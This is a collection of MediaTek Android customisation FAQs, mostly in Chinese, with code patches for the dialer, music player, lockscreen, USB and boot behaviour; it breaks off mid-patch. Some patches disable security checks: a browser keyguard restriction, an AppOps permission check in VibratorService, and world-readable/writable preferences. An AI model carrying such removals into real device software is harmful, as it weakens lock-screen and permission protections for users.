使用步骤：插入USB，进入settings -> wireless&networks ->more -> Tethering & portable hotspot ->USB tethering,勾选USB tethering，即可使用。

2.USB Internet 是手机利用PC的网络进行上网。这是89上的新功能。

使用前提：安装RNDIS驱动（必须）
使用步骤：
1.安装驱动（在设备管理器中检查是否所有的驱动都有安装好）
2.Connect with PC via USB cable. (Rndis driver installed)
3.open the USB Intenet
4.Check new Local Area Connection is connected
5.Share the Internet to new Local Area Connection
选择local area-》属性-》高级-》勾选允许其他网络用户通过此计算机的Internet连接来连接
家庭网络选择新产生的那个网络-》确定
notes:由于USB Internet是手机利用PC的网络进行上网，所以在打开USB Internet之后，之前打开的数据连接或者wifi都会自动关闭。

如果有发现无法执行以上功能，请务必确定驱动是否有安装好.
如果有开启USB调试,需要重新安装ADB+RNDIS的组合驱动,
```

## [FAQ14575]  L版本email附件下载安全策略

```text
Android L enhance了安全策略，对附件下载有了更严格的限制。
Android L email 附件，在如下任何一条满足都不允许下载
1. 没有external storage，如SD卡
2. 后缀名为"ade", "adp", "bat", "chm", "cmd", "com", "cpl", "dll", "exe", "hta", "ins", "isp", "jse", "lib", "mde", "msc", "msp", "mst", "pif", "scr", "sct", "shb", "sys", "vb", "vbe", "vbs", "vxd", "wsc", "wsf", "wsh",
3. Server不允许下载到本地的附件。
4. 大小超过5M的附件
5. 文件content type不能被client端中任何application识别或打开的文件。
详细规则请查看class AttachmentInfo的构造函数。
```

## [FAQ11801]  多方通话中menu中呼叫转接的作用

```text
1、测试机A、B、C，A呼叫B建立通话，然后A再与C建立通话；
2、点A InallScreen界面的menu，出现功能项“呼叫转接”，点击“呼叫转接”
结果：没有反应
[SOLUTION] 
以上述case中的多方通话为例，执行“呼叫转接”后，那么A分别中断和B、C的通话连接；而同时，B和C建立通话；
但这个功能需要运营商支持，大陆目前不支持该功能；
```

## [FAQ10942]  流量使用情况的横屏问题

```text
data usage界面是不会根据横竖屏状态，自动转屏的
该现象由以下代码造成
/** M: set the screen orientation according to the parent,to fix the histogram displayed
  problem when switching screen between portrait and landscape@{ */
int orientation = getActivity().getResources().getConfiguration().orientation;
int winOrientation = ActivityInfo.SCREEN_ORIENTATION_SENSOR_PORTRAIT;
Xlog.i(TAG,"current config orienation " + orientation);
if (orientation == Configuration.ORIENTATION_LANDSCAPE) {
    winOrientation = ActivityInfo.SCREEN_ORIENTATION_SENSOR_LANDSCAPE;
}
getActivity().setRequestedOrientation(winOrientation);
/** @} */

加上这个判断的原因是因为如果允许转屏的话.流量使用的那个正方形的那个坐标图片显示会有问题（竖屏的时候和横屏的时候那个最底下那个坐标点的位置会不对）
所以不建议去掉这段.保持现有design
```

## [FAQ11322]  [Dialer] 如何关闭通话录音功能?

```text
KK及之前的版本：
将alps/packages/apps/phone/src/com/mediatek/phone/PhoneFeatureConstants.java中的内部类
FeatureOption的MTK_PHONE_VOICE_RECORDING开关置为false即可.

L版本：
将alps/packages/apps/incallui/src/com/mediatek/incallui/wrapper/FeatureOptionWrapper.java 中的isSupportPhoneVoiceRecording() 函数的返回值改为false即可。
```

## [FAQ11450]  [Dialer] JB版本上设置默认快速拨号并不可编辑

```text
JB版本上设置默认快速拨号并不可编辑.
 
[SOLUTION] 
 
首先需要预置联系人，
假设联系人姓名：Y, 号码：1234, 设为按键3的快速拨号
 
 
1 修改SpeedDialManageActivity.java
private void getPrefStatus() {
    Log.i(TAG, "getPrefStatus()");
    mPref = getSharedPreferences(PREF_NAME, Context.MODE_WORLD_READABLE
            | Context.MODE_WORLD_WRITEABLE);
    mHasGotPref = true;
    for (int i = SPEED_DIAL_MIN; i < SPEED_DIAL_MAX + 1; ++i) {
        mPrefNumState[i]  = mPref.getString(String.valueOf(i), "");
        mPrefMarkState[i]  = mPref.getInt(String.valueOf(offset(i)), -1);
    }
    //加入：
    mPrefNumState[3]  = new String("1234");
}

2 SpeedDail.java
public boolean dial(int key) {
    String number = getSpeedDialNumber(key);
    //加入下面：
    if (key == 3) {
        number = "1234";
    }


3 SpeedDialManageActivity.java,
public void onClick(View v) {
    // TODO Auto-generated method stub
    if (v.getId() == R.id.sd_remove) {
        int position = -1;
        for (int i = 0; i < mListView.getCount(); ++i) {
            if (mListView.getChildAt(i) == v.getParent()) {
                position = i;
                break;
            }
        }
        Log.d(TAG, "onClick(),  before confirmRemovePosition(), position= " + position);
// 加入下面这句：

if(position == 2) return;
confirmRemovePosition(position + mListView.getFirstVisiblePosition());


4 SpeedDialManageActivity.java,
protected void onListItemClick(ListView l, View v, int position, long id) {
    Log.i(TAG, "onListItemClick");
    /*
    if (position == 0) {
        return;
    }
    */
    if (position == 0 || position == 2) {
        return;
    }
```

## [FAQ12912]  [Music App] 将录音文件从音乐播放器列表中移除

```text
用 soundRecorder apk 录音, 会发现录音文件列表自动出现在音乐播放器中
如何让录音文件列表不出现在音乐播器中
[SOLUTION] 
需要修改 SoundRecorderService.java 
将 addToMediaDB 中下面两个方法的调用注释掉:
1: createPlaylist
2: addToPlaylist
```

## [FAQ12911]  [Music App] 音乐播放器会关联到视频文件的问题

```text
有一些视频文件, 因其视频格式不支持播放, 而音频格式却支持播放
所以会在 music 中看到这些文件
 
如果不想让这些文件出现在 music 中
可以参考如下解法
 
[SOLUTION] 
1: 先确定这些文件的 mimeType, 如果不知道如何确定, 可导出手机中下面路径下的数据库
data/data/com.android.providers.media/databases/external.db 或者
data/data/com.android.providers.media/databases/external-xxx.db
从这只 database 中找到你需要处理文件的记录, 然后找到此记录中的 mime_type, 其值便是我们需要的 mimtType.
 
2: 之后修改MediaScanner.java :
a: 添加定义:
static String TARGET_MIME = "audio/x-flv"; //用1中的 mimetype 替换它, 假设是 audio/x-flv
static String MIME_UNKNOW_FLV = "unknown_flv";
 
b: private ContentValues toValues() 方法首行加入:
if((mMimeType != null) && mMimeType.equals(TARGET_MIME)) {
    mMimeType  MIME_UNKNOW_FLV;
    mNoMedia  true;
}

c: endFile 方法中在如下参考行
ContentValues values  toValues();
之后加入:
if((mMimeType != null) && mMimeType.equals(MIME_UNKNOW_FLV)){
    mFileType  0;
    music  0;
}
```

## [FAQ12910]  [Music] 音乐播放器如何在俄语下支持英文字母快速索引

```text
默认在俄语下, 音乐播放器只支持俄语字符的快速索引
如果需要增加英文快速索引, 可以作以下修改
[SOLUTION] 
打开 music 包下的 res 文件夹中找到俄语包下的资源文件夹 (values-ru) 下的 strings.xml
即 packages\apps\Music\res\values-ru\strings.xml
 
找到 fast_scroll_alphabet 的定义, 一般定义成如下:
<string name="fast_scroll_alphabet" msgid="5548732936480723311">" АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ"</string>
将其内容改为:
<string name="fast_scroll_alphabet" msgid="5548732936480723311">" ABCDEFGHIJKLMNOPQRSTUVWXYZАБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ"</string>
```

## [FAQ15193]  [Dialer] 电话接通之前发送DTMF

```text
按照 Spec 要求，电话在接通之后才可以发送 DTMF。但是有些运营商要求电话接通前就要可以发送 DTMF。
比如东南亚很多国家如老挝等有一些服务电话，就需要使用 DTMF 来做回复，而此时电话是没有接通的。
针对L0版本可以参考如下修改，L1版本已经默认合入了修改。

[SOLUTION] 
 1. CallList.java
// 添加如下函数
public Call getOutgoingOrActive() {
    Call retval = getOutgoingCall();
    if (retval == null) {
        retval = getActiveCall();
    }
    return retval;
}

2. DialpadFragment.java (alps/packages/apps/incallui/src/com/android/incallui)
//添加如下函数
/**
* M: ALPS01837728 used to clear digits when call state changes.@{
*/
@Override
public void clearDigits() {
    if (mDtmfDialerField != null) {
        mDtmfDialerField.setText("");
    }
}
/**@}*/


3. DialpadPresenter.java
//修改如下函数
@Override
public void onUiReady(DialpadUi ui) {
    super.onUiReady(ui);
    InCallPresenter.getInstance().addListener(this);
    mCall = CallList.getInstance().getOutgoingOrActive();
}


@Override
public void onStateChange(InCallPresenter.InCallState oldState, InCallPresenter.InCallState newState, CallList callList) {
    /**
    * M: ALPS01837728, need to clear digits if call state change.@{
    */
    /* Google code:
    mCall = callList.getActiveCall();
    */
    Call call = callList.getOutgoingOrActive();
    if (!Call.areSame(mCall, call)) {
        getUi().clearDigits();
    }
    mCall = call;
    /** @} */
    Log.d(this, "DialpadPresenter mCall = " + mCall);
}
//增加一个接口
public interface DialpadUi extends Ui {
    void setVisible(boolean on);
    void appendDigitsToField(char digit);
    // / M: add for ALPS01837728.
    void clearDigits();
}
```

## [FAQ13534]  [Dialer] L版本如何去掉IP拨号功能

```text
1. 去掉 “menu->设置->语音电话->IP号码前缀” 菜单.
修改Call_feature_setting.xml文件，注释如下代码：
<PreferenceScreen
    android:key="button_ip_prefix_key"
    android:title="@string/ip_prefix_setting"
    android:summary="@string/ip_prefix_setting_sum"
    android:persistent="false">
    <intent android:action="android.intent.action.MAIN"
        android:targetPackage="com.android.phone"
        android:targetClass="com.mediatek.settings.IpPrefixPreference"/>
</PreferenceScreen>

2. 去掉“menu->IP拨号”菜单
alps/packages/apps/dialer/src/com/android/dialer/dialpad/dialpadFragment.java,在 buildOptionsMenu() 方法中，把如下语句：
menu.findItem(R.id.menu_ip_dial).setVisible(!PhoneNumberHelper.isUriNumber(mDigits.getText().toString()));
改成：
menu.findItem(R.id.menu_ip_dial).setVisible(false);
  
3. 修改 TelecomUtils.java 文件，将
public static final boolean MTK_IP_PREFIX_SUPPORT = true;
修改为
public static final boolean MTK_IP_PREFIX_SUPPORT = false;

4. 修改 CallLogAdapter.java 文件的 bindActionButtons() 方法，将
if (!PhoneNumberHelper.isUriNumber(views.number)) {
    views.ipDialButtonView.setVisibility(View.VISIBLE);
} else {
    views.ipDialButtonView.setVisibility(View.GONE);
}
修改为
views.ipDialButtonView.setVisibility(View.GONE);
```

## [FAQ12564]  [Dialer] 双拨号键对应SIM卡拨打电话的实现

```text
拨号界面使用双卡拨号，不要拨号选择框，直接点击卡一卡二各自button 拨出去电话
 
[SOLUTION] 
UI界面：
请客户自行客制化卡1卡2的button图片，并修改拨号盘布局文件。

代码部分：
修改拨打电话的intent，在intent中指定slot id，即可直接用卡一或卡二直接拨出。
for example：
import com.android.phone.Constants;

Intent intent = new Intent(Intent.ACTION_CALL);
intent.putExtra(Constants.EXTRA_SLOT_ID, slot);//slot值为0或1，分别代表卡1，卡2
```

## [MMS]  [FAQ17392]  Messaging apk and Mms apk for Android M

```text
1. Messaging 是Google将M之前的GMS中一个闭源的apk(Bugle)代码放入AOSP源码中，
有短彩信功能，但是缺少双卡逻辑以及各个运营商定制功能的处理逻辑

2. 基于第一点，考虑到MTK Mms已相对稳定性，以及针对各运营商添加的plugin的完善性，
在Android M上依然保持使用Mms代码，但是遵循 AOSP 机制，不能直接取代Messaging，
而是放在路径 /vendor/mediatek/proprietary/packages/apps/Mms/ 下，
编译时，只编译进 MtkMms，不编译 messaging

3. 基于Messaging开发需要开发双卡逻辑以及各个运营商定制功能的处理逻辑，effort较大，
并且MTK暂无基于Messaging开发的计划，因此请保持使用Mms

综上，Android M 上MTK依然保持使用Mms
```

## [log]  [FAQ17391]  如何抓取OpenGLES log?

```text
在分析画面异常问题时，有时需要抓取OpenGLES log，以便分析送给GPU的指令流是怎么样的?
 
[SOLUTION] 
进入Settings->developer options->Enable OpenGL trace，勾选logcat
然后手机连接usb至电脑，执行如下命令：
adb shell stop
adb shell start
然后再开启mobile log，抓取复现过程的log
 
备注：
1.如何进入开发者选项(developer options)?请参考如下FAQ：
ID: FAQ07781 user版本时，设置里，如何将“开发者选项”选项显示出来
2.若不方便在Settings开发者选项界面勾选"logcat"选项，可以用命令行设置，参考如下FAQ：FAQ List
ID: FAQ14788 如何用命令设置开发者选项中Enable OpenGL traces的各个选项?
```

## [fstab]  [FAQ13592]  在fstab 中使用footer 与 metadata 加密设置的区别

```text
在fstab 中使用footer 与 metadata 加密设置的区别 
[Solution] 
在fstab 中我们可以看到加密描述如forceencrypt=footer 或者 forceencrypt=/dev/block/platform/mtk-msdc.0/by-name/metadata. 

注意这个metadata 的path, 需要根据fstab 中的metadata 描述填写，在M 版本后这个path 根据不同的平台稍有不同, 比如MT6580 变成了/dev/block/platform/mtk-msdc.0/11120000.MSDC0/by-name/metadata
他们的区别即是存储加密资讯(加密状态, 加密key) 的位置不同, 如果使用footer 即表示使用的userdata 分区的最后16 Kbytes； 使用metadata 即是用一个专门的metadata(32M)分区存放这些资讯.

如果使用metadata, 要确保在分区表中已经定义好了metadata 分区.
默认目前我们只有MT6752 使用metadata 存储, 其它都使用footer 存放.
```

## [FAQ15588]  [FM] 如何在飞行模式开启的情况下，使FM不可用

```text
请参考如下代码修改:
一、在FmMainActivity.java中
1. 导入包 import com.android.settings.AirplaneModeEnabler;
2. 在 onStart() 方法的一开始加上如下代码：
if (AirplaneModeEnabler.isAirplaneModeOn(mContext)==true) {
    showToast(getString(R.string.not_available_airplanemode));
    finish();
    return;
}
二、在在alps\packages\apps\fmRadio\res\values\strings.xml中添加
<string name="not_available_airplanemode">FM is not available under airplane mode</string>
```

## [FAQ15585]  [Music] 第一次开机或者恢复出厂设置，进入music中的铃声设置use as ringtone，设置自定义铃声为T卡音乐，来电还为默认铃声

```text
第一次开机或者恢复出厂设置，进入music player的铃声设置use as ringtone，设置自定义铃声为T卡音乐，来电还为默认铃声。

[SOLUTION] 
1.  此问题仅在开启双卡铃声功能时才会出现，所以在出现此现象时，先按照如下步骤确认此问题是否为双卡
铃声功能的开启而引起：
请检查宏MTK_MULTISIM_RINGTONE_SUPPORT是否有打开，并插入两张卡在情景模式中看是
否可以分别设置两张卡的铃声，如果可以，就是开启了双卡铃声功能的。
另外您也可以通过关闭此宏MTK_MULTISIM_RINGTONE_SUPPORT，来确认上面描述的问题是
否还存在，以进一步确认是否跟双卡铃声有关。
2. 如果确认此问题是由双卡铃声功能的开启而引起，那请按如下修改来完善在music player中的双卡铃声功
能，以解决上述描述的问题。
参考FAQ10419来修改music player的相关代码。
```

## [FAQ14891]  [Audio App] 录音机在录音时关机，正在录音的文件会被保存为.tmp临时文件，如何保存为正常文件?

```text
SoundRecorderService.java文件中
else if (Intent.ACTION_SHUTDOWN.equals(action) || ACTION_SHUTDOWN_IPO.equals(action)) {
    // save the recording parameters
    storeRecordParamsSettings();
    //修改如下
    if ((STATE_RECORDING == mCurrentState) || (STATE_PAUSE_RECORDING == mCurrentState)) {
        stopRecord();
    } else if (STATE_PLAYING == mCurrentState) {
        stopPlay();
    }
    if (isCurrentFileWaitToSave()) {
        saveRecordAsync();
    } 
    //修改如上
}
```

## [launcher]  [FAQ16696]  第一次开机或者恢复出厂设置后，桌面小部件一直不更新无图标

```text
目前已知的最可能原因：GMS中的SetupWizard多次重新叫起Launcher，导致Launcher开机监听AppWidget和停止监听AppWidget的时序错乱。
解决方法：
请修改Launcher.java的onCreate方法，将下面的code：
mAppWidgetHost = new LauncherAppWidgetHost(this, APPWIDGET_HOST_ID);
mAppWidgetHost.startListening();
修改为：
mAppWidgetHost = new LauncherAppWidgetHost(this, APPWIDGET_HOST_ID);
mHandler.postDelayed(new Runnable() {
    @Override
    public void run() {
        mAppWidgetHost.startListening();
    }
}, 2000);
如果不行的话，请将runnable的参数，即2000再改大试一试。
```

## [FAQ04163]  [AudioProfile] 移除AudioProfile，恢复Google default sound Setting

```text
目前在大多数版本都是直接将MTK_AUDIO_PROFILES=yes 改为no就可以关闭audio profile，但是L版本关闭后还是有问题，不能运行。 需要修改如下：
先将MTK_AUDIO_PROFILES=yes 改为no， 然后按照如下修改：
1. Settings/src/com/android/settings/SettingsActivity.java 大约123和338行的关于AudioProfileSettings 
的删掉；
2. Settings/src/com/android/settings/search/SearchIndexableResources.java 大约57和304行，也是删除AudioProfileSettings 相关的；
3. Settings/src/com/android/settings/search/SearchIndexableResources.java， 把NotificationSettings .class.getName这个要打开， 原本是注释掉的。
4. Settings/res/xml/dashboard_categories.xml 中，将 android:fragment="com.mediatek.audioprofile.AudioProfileSettings" 
改为
android:fragment="com.android.settings.notification.NotificationSettings"

5. 修改AbsSeekBar.java文件

alps\frameworks\base\core\java\android\widget\AbsSeekBar.java

@Override
protected void drawableStateChanged() {
    super.drawableStateChanged();

    final Drawable progressDrawable = getProgressDrawable();
    if (progressDrawable != null) {
        progressDrawable.setAlpha(isEnabled() ? NO_ALPHA : (int) (NO_ALPHA * mDisabledAlpha));
    }

    final Drawable thumb = mThumb;
    if (thumb != null && thumb.isStateful()) {
        thumb.setState(getDrawableState());

        // Different state could choose another drawable such that its size and appearance
        // could be totally different. Need to request for a update. Refer ALPS01659821
        // for details.
        //调用了该方法导致的，不要这句，不然会出现popwindow一闪而过现象。
        //requestLayout();
    }
}

然后重新编译整个工程。
```

## [FAQ04160]  [Dialer] 如何去除拨号盘中的格式调整

```text
修改DialpadFragment.java文件，注释掉如下代码即可去除拨号盘中的格式调整：
PhoneNumberFormatter.setPhoneNumberFormattingTextWatcher(getActivity(), mDigits);
```

## [FAQ12518]  [Dialer] 如何将+7和8开头号码的通话记录合并为同一条

```text
关联FAQ:
FAQ12521：如何在通话界面上实现+7和8互相匹配
FAQ12523：在联系人搜索界面中同时搜到+7开头和8开头的记录

[SOLUTION] 

[KK Version] 
请修改CallLogGroupBuilderEx.java中的addGroups函数.

修改分为两处：
1 final boolean sameNumber = equalNumbers(firstNumber, currentNumber);修改为
boolean sameNumber = equalNumbers(firstNumber, currentNumber);

2 final boolean isSameDay = CallLogDateFormatHelper.isSameDay(firstDate, date);的后面加入代码：
String currentNumber2;
if(sameNumber == false){
 if(currentNumber.startsWith("8")){
  currentNumber2 = currentNumber.substring(1);
  LogUtils.d(TAG, "1 currentNumber1:"+currentNumber2);
  currentNumber2 = "+7"+currentNumber2;
     LogUtils.d(TAG, "2 currentNumber1:"+currentNumber2);
  
  sameNumber = equalNumbers(firstNumber, currentNumber2);
  LogUtils.d(TAG, "first number1 "+firstNumber+"currentNumber1: "+currentNumber2+"sameNumber1: "+sameNumber);
             }else if(currentNumber.startsWith("+7")){
              currentNumber2 = currentNumber.substring(2);
  LogUtils.d(TAG, "1 currentNumber2:"+currentNumber2);
  currentNumber2 = "8"+currentNumber2;
     LogUtils.d(TAG, "2 currentNumber2:"+currentNumber2);
  
  sameNumber = equalNumbers(firstNumber, currentNumber2);
  LogUtils.d(TAG, "first number2 "+firstNumber+"currentNumber2: "+currentNumber2+"sameNumber2: "+sameNumber);
              }
}
[L Version] 
CallLogGroupBuilderEx.java替换为CallLogGroupBuilder.java, 修改内容同上.
```

## [log]  [FAQ06722]  [Debug]  如何抓 Bootrom log?

```text
Bootrom log 在Bootrom 启动阶段输出。
如果系统能下载，但不能启动，看不到 preloader log, 需要抓 Bootrom log
可以通过连接UART1 设置波特率115200 抓log。
Log 请提交到eService上以供分析。
```

## [FAQ08308]  锁屏界面有未接电话/未读信息，解锁后不查看未读事件，直接锁屏不显示未接来电/未读信息

```text
此为目前的design，仿Iphone设计。
解锁之后锁屏界面dismiss. 再次锁屏是重新绘制一遍锁屏界面。
绘制锁屏时，查询未读信息/未接电话的数目是针对本次锁屏后收到的未读信息/未接电话。
代码如下：
KeyguardUpdateMonitor.java
public void setQueryBaseTime() {
    mQueryBaseTime = java.lang.System.currentTimeMillis();
}
这里会设置mQueryBaseTime值，这个值作为此次创建keyguard时查询unread sms/mms的一个query条件，使得Mms.DATE +  >= mQueryBaseTime。
这样就只会query出本次keyguard创建之后接收的unread event. 后面所说这部分代码是mtk lib方式release.
 
根据此原理，只要每次显示是mQueryBaseTime都比Mms.DATE 小就可以一直显示出来。
以下是一中办法:
KeyguardViewManager.java
public synchronized void show(Bundle options) {
    ...
    /// M: Incoming Indicator for Keyguard Rotation @{
    //  KeyguardUpdateMonitor.getInstance(mContext).setQueryBaseTime(); 注释掉此行。 不给mQueryBaseTime赋值，因此mQueryBaseTime一直都是0，永远比Mms.DATE小。
    /// @}
    ...
}

KeyguardUpdateMonitor.java /KeyguardViewManager.java 在以下路径:
for JB branch: alps\frameworks\base\policy\src\com\android\internal\policy\impl\keyguard\
for KK branch: alps\frameworks\base\packages\Keyguard\
```

## [FAQ12025]  KK 版本的 keyguard 如何添加 widget (设置安全中的Enable Widgets 有何用)

```text
KK 版本的 keyguard 其实也是可以添加 widget 的
前提条件是要把 设置 --> 安全 --> 启用小部件 (Enable Widget) 勾选上才可以添加
如果不勾选, 那在滑动锁屏默认那页上,只能向左滑动进入 camera widget, 但却不能往右滑动去添加 widget 及显示添加的新的 widget.
如果勾选了, 在滑动锁屏界面的默认那页上, 可以向右滑动, 并出现添加 widget 的那个button, 点击此 button 可以添加新的 widget
注: low ram(512及512以下)的device由于内存太小，Android把它diable掉了，因此在low ram的device上看不到此feature。
```

## [sysui]  [FAQ06275]  如何将锁屏变为透明?

```text
ICS/ICS2/JB:
1、请修改KeyguardViewManager.java的show方法，将|WindowManager.LayoutParams.FLAG_SHOW_WALLPAPAR;注释掉；
2、请修改KeyguardViewBase.java的resetBackground()方法，将setBackground(mBackgroundDrawable);注释掉；
3、请修改PhoneWindowManager.java的doesForceHide方法，将attrs.type == WindowManager.LayoutParams.TYPE_KEYGUARD;替换为false;

JB2 & KK:
1、请修改KeyguardViewManager.java的maybeCreateKeyguardLocked方法，将|WindowManager.LayoutParams.FLAG_SHOW_WALLPAPAR;注释掉；
2、请修改KeyguardViewBase.java的resetBackground()方法，将setBackground(mBackgroundDrawable);注释掉；
3、请修改PhoneWindowManager.java的doesForceHide方法，将attrs.type == WindowManager.LayoutParams.TYPE_KEYGUARD;替换为false;
4、请修改keyguardViewManager.java的updateShowWallpaper()方法，将以下语句注释:
/* 
if (show) {
    mWindowLayoutParams.flags |= WindowManager.LayoutParams.FLAG_SHOW_WALLPAPER;
} else {
    mWindowLayoutParams.flags &= ~WindowManager.LayoutParams.FLAG_SHOW_WALLPAPER;
}
*/
```

## [sysui]  [FAQ10470]  锁屏界面运营商名称显示全大写

```text
对于KK之前的版本:
如果您想区分大小写，维持运营商名称原貌，方法如下：
 
在frameworks\base\policy\src\com\android\internal\policy\impl\keyguard\ KeyguardViewManager.java中
 
将 USE_UPPER_CASE修改为false
 
重新build 即可
 
对于KK的版本:
转换大写的方式是呼叫ICarrierTextExt.java中的changedPlmnToCapitalize()来完大小写切换。修改该方法即可完成大写小的变换。
 
那changedPlmnToCapitalize是以插件方式实现的。 default是有DefaultCarrierTextExt.java实现。如果是打开OP09的feature，那就由OP09CarrierTextExt.java来实现该方法。
 
其他 网络运营商名称 显示问题，请参考：
ID: FAQ08919
网络运营商名称显示规则（锁屏界面，下拉列表）---网络名称 客制化方法 和 问题处理flow
ID: FAQ11619
通知栏下面运营商信息显示为大写
```

## [sysui]  [FAQ12517]  滑动解锁中如何启动默认浏览器

```text
在锁屏客制化时，或增加快捷解锁应用入口，如果在快捷如后启动默认的浏览器(com.android.browser)会发现无法启动.
无法启动的原因:
在启动browser这个activity时才会去dismiss keyguard，而browser activity在onCreate时候会检查keyguard的状态，发现此时Keyguard还是showing(因为keyguard dismiss需要一个过程，在dismiss的最后阶段showing才会置成false)，因此就finish掉自身。

KeyguardActivityLaunch.java, 在activity启动是才dismisskeyguard
[SOLUTION] 
解法： 在BroswerActivity.java中的shouldIgnoreIntents()注释掉此行代码，取消此限制。
// ignore != mKeyguardManager.inKeuguardRestrictedInputMode();
```

## [FAQ03602]  [Dialer] 通话记录条数的限制

```text
在frameworks\base\core\java\android\provider下面有CallLog.java，这支文件里，每当完成一通电话向call表中插入一条callLog记录后，调用removeExpiredEntries这个函数将超过500条的那条记录
如果要对其限制条件进行修改的话，可以对这个函数进行
 
E.g:根据不同类型的通话记录对其进行限制，步骤如下：
1.首先对函数添加一个callType的参数(INCOMING_TYPE = 1; OUTGOING_TYPE = 2; MISSED_TYPE = 3;)，同时要在调用这几个函数的地方进行修改，即将   removeExpiredEntries(context);改成
removeExpiredEntries(context,callType);
2.然后在
resolver.delete(CONTENT_URI, "_id IN " + "(SELECT _id FROM calls ORDER BY " + DEFAULT_SORT_ORDER + " LIMIT -1 OFFSET 500)", null);
这里加上where calls.type=callType判断条件
```

## [bootanimation]  [FAQ15574]  开机动画和开机铃声不同步

```text
开机时，开机铃声比开机动画晚了几秒。

原因可能是，在new MediaPlayer对象时，有get battery status的操作，而batteryservice在稍后的systemserver进程的初始化才启动，所以导致new MediaPlayer对象的操作在此等待，导致铃声播放延时。且对battery status统计code遍布整个branch，在此拿掉不会造成任何功能性的影响。
[SOLUTION] 
可以同时删除以下code测试。
/frameworks/av/media/libstagefright/MediaCodec.cpp
void MediaCodec::setState(State newState) {
updateBatteryStat(); //delete

/frameworks/av/media/libmediaplayerservice/MediaPlayerService.cpp
MediaPlayerService::MediaPlayerService()
{
//----------------------delete----------------------------------
const sp<IServiceManager> sm(defaultServiceManager());
if (sm != NULL) {
    const String16 name("batterystats");
    sp<IBatteryStats> batteryStats =
    interface_cast<IBatteryStats>(sm->getService(name));
    if (batteryStats != NULL) {
        batteryStats->noteResetVideo();
        batteryStats->noteResetAudio();
    }
}
}
//----------delete-------------------
```

## [storage]  [FAQ16168]  怎么在使用mtp功能的同时开启bicr

```text
以6795 L0.MP6为例：
1、init.mt6795.usb.rc
#6.mtp
#on property:sys.usb.config=mtp
on property:sys.usb.config=mtp,bicr
write /sys/class/android_usb/android0/enable 0
write /sys/class/android_usb/android0/idVendor ${sys.usb.vid}
#write /sys/class/android_usb/android0/idProduct 2008
write /sys/class/android_usb/android0/idProduct 2AAA #使用PC上没有装过驱动的PID
#write /sys/class/android_usb/android0/functions ${sys.usb.config}
write /sys/class/android_usb/android0/functions mtp,mass_storage
write /sys/class/android_usb/android0/f_mass_storage/bicr 1
write /sys/class/android_usb/android0/f_mass_storage/lun/file "/dev/block/loop0"
write /sys/class/android_usb/android0/enable 1
setprop sys.usb.state ${sys.usb.config}

#8.mtp,adb
#on property:sys.usb.config=mtp,adb
on property:sys.usb.config=mtp,bicr,adb
write /sys/class/android_usb/android0/enable 0
write /sys/class/android_usb/android0/idVendor ${sys.usb.vid}
#write /sys/class/android_usb/android0/idProduct 201D
write /sys/class/android_usb/android0/idProduct 2AAB
#write /sys/class/android_usb/android0/functions mtp,adb
write /sys/class/android_usb/android0/functions mtp,mass_storage,adb
write /sys/class/android_usb/android0/f_mass_storage/bicr 1
write /sys/class/android_usb/android0/f_mass_storage/lun/file "/dev/block/loop0"
write /sys/class/android_usb/android0/enable 1
start adbd
setprop sys.usb.state ${sys.usb.config}
 
2、UsbDeviceManager.java，这里添加注释包起来的部分。
public void setCurrentFunctions(String functions, boolean makeDefault) {
    //wqtao.add.start.
    if(functions.equals(UsbManager.USB_FUNCTION_MTP)){
        Slog.d(TAG, "wqtao. setCurrentFunctions hack functions setting.");
        functions = addFunction(functions, UsbManager.USB_FUNCTION_BICR);
    }
    //wqtao.add.end.
    if (DEBUG) {
        Slog.d(TAG, "setCurrentFunctions(" + functions + ") default: " + makeDefault);
    }
    mHandler.sendMessage(MSG_SET_CURRENT_FUNCTIONS, functions, makeDefault);
}
 
这里是添加的mtp+bicr。ptp+bicr等可以类似添加，参考修改。
```

## [encryption]  [nvram]  [FAQ15743]  How to enable GEA4

```text
Method 1. Use meta tool to modify NVRAM
NVRAM_EF_CLASSMARK_RACAP_L1D->Byte 11，Enable GEA4 and save NVRAM.

Method 2. Modify file nvram_data_items.c，under NVRAM_EF_CLASSMARK_RACAP_DEFAULT[] ，
modify byte 11 to value 0xF1 which means GEA-1,2,3,4 and SM cap support.
```

## [FAQ15592]  如何解决wifi 连接过程中，状态栏显示为0x

```text
请修改如下位置code；

/frameworks/base/wifi/java/android/net/wifi/WifiSsid.java
public String getHexString() {
    String out = "0x"; //这里的初始值，修改为贵司想要的string 显示
    byte[]  ssidbytes = getOctets();
    for (int i = 0; i < octets.size(); i++) {
        out += String.format(Locale.US, "%02x", ssidbytes[i] );
    }
    return out;
}
调用过程如下：

/frameworks/base/wifi/java/android/net/wifi/WifiInfo.java
public String getSSID() {
    if (mWifiSsid != null) {
    String unicode = mWifiSsid.toString();
    if (!TextUtils.isEmpty(unicode)) {
        return "\"" + unicode + "\"";
    } else {
        return mWifiSsid.getHexString();
    }
    return WifiSsid.NONE;
}
 
出现的原因一般是在wifi 连接or 漫游时，会有一个ssid 为null 的过程；
从而在状态栏中，如果此过程持续时间长一点，即会看到短暂的0x显示过程；
```

## [bootanimation]  [FAQ15573]  开机动画结束时增加振动提示

```text
在进入launcher前增加振动功能solution：
振动500ms。

/frameworks/base/services/core/java/com/android/server/wm/WindowManagerService.java
//-------------add--------------------
// length of vibration before boot up
private static final int BOOTUP_VIBRATE_MS = 500;
private static final AudioAttributes VIBRATION_ATTRIBUTES = new AudioAttributes.Builder()
.setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
.setUsage(AudioAttributes.USAGE_ASSISTANCE_SONIFICATION)
.build();
//-------------add--------------------

6424 public void performEnableScreen() {
...
6483 mDisplayEnabled = true;
6484 if (DEBUG_SCREEN_ON || DEBUG_BOOT) Slog.i(TAG, "******************** ENABLING SCREEN!");
//-------------add--------------------
1076 // vibrate before boot up
1077 Vibrator vibrator = new SystemVibrator();
1078 try {
1079 vibrator.vibrate(BOOTUP_VIBRATE_MS, VIBRATION_ATTRIBUTES);
1080 } catch (Exception e) {
1081 // Failure to vibrate shouldn't interrupt boot up. Just log it.
1082 Log.w(TAG, "Failed to vibrate during boot up.", e);
1083 }
//-------------add--------------------
6486 // Enable input dispatch.
6487 mInputMonitor.setEventDispatchingLw(mEventDispatchingEnabled);

/frameworks/base/services/core/java/com/android/server/VibratorService.java
391 private void startVibrationLocked(final Vibration vib) {
//将该部分注释掉
404 if (mode != AppOpsManager.MODE_ALLOWED) {
